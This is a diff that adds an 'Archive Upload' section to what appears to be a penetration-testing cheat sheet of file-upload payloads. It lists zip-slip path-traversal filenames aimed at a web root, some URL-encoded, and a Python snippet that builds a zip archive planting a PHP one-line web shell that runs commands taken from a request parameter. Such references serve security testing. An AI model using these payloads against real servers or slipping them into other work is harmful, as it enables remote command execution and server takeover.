@@ -71,3 +71,21 @@ as `shell.jpg`.
 ....//....//tmp/shell.php
 ```
 
+## Archive Upload
+
+Zip slip filenames:
+
+```text
+../../../../var/www/html/shell.php
+..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php
+/var/www/html/shell.php
+```
+
+Create a zip with a traversal name:
+
+```python
+import zipfile
+
+with zipfile.ZipFile("pwn.zip", "w") as z:
+    z.writestr("../../../../var/www/html/shell.php", "<?=`$_GET[0]`?>")
+```
